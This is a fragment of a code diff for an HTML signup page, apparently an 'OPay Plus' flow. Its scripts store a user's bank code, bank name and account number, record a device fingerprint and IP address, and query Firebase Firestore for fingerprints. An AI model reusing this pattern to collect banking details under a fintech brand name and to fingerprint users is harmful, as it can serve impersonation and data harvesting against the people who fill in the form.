+                    localStorage.setItem('opayBankCode', bankCode);
+                    localStorage.setItem('opayBankName', bankName);
+                    localStorage.setItem('opayAccountNumber', accountNumber);
+
+                    // Store fingerprint for future use (optional)
+                    const fingerprint = getDeviceFingerprint();
+                    localStorage.setItem('opayDeviceFingerprint', fingerprint);
+
+                    showLoader(true);
+                    fetchUserIP().then(ip => localStorage.setItem('opayUserIP', ip));
+
+                    setTimeout(() => {
+                        window.location.href = 'create-email.html';
+                    }, 2000);
+                }
+            });
+
+            // Expose function for the Firebase module (still defined but not used to block)
+            window.checkFingerprintInFirestore = async function(fingerprint) {
+                return false; // placeholder, overridden by module
+            };
+
+            // Initialize UI state
+            updateButtonState();
+
+            // REMOVED automatic existing-user check on page load
+        })();
+    </script>
+
+    <!-- Firebase Module -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-app.js";
+        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-auth.js";
+        import { getFirestore, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAjLxkisBi9pzmjlwdHnYfo25XR2Z6ToEs",
+            authDomain: "opay-plus-5802c.firebaseapp.com",
+            projectId: "opay-plus-5802c",
+            storageBucket: "opay-plus-5802c.firebasestorage.app",
+            messagingSenderId: "967061625774",
+            appId: "1:967061625774:web:236f88391ccdd9edd2863f",
+            measurementId: "G-H0QV81VYBY"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+
+        // If user already logged in, redirect to createpass.html
+        onAuthStateChanged(auth, (user) => {
+            if (user) {
+                window.location.href = 'createpass.html';
+            }
+        });
+
+        // Override the fingerprint check to query Firestore (no longer used for blocking, but kept for completeness)
+        window.checkFingerprintInFirestore = async function(fingerprint) {
+            try {
+                const usersRef = collection(db, 'users');
+                const q = query(usersRef, where('deviceFingerprint', '==', fingerprint));
+                const querySnapshot = await getDocs(q);
+                return !querySnapshot.empty;
+            } catch (err) {
+                console.error('Firestore query error:', err);
+                return false;
+            }
+        };
+    </script>
+    <script src="/pwa-check.js"></script>
+    <script src="/network-popup.js"></script>
+</body>
+</html>
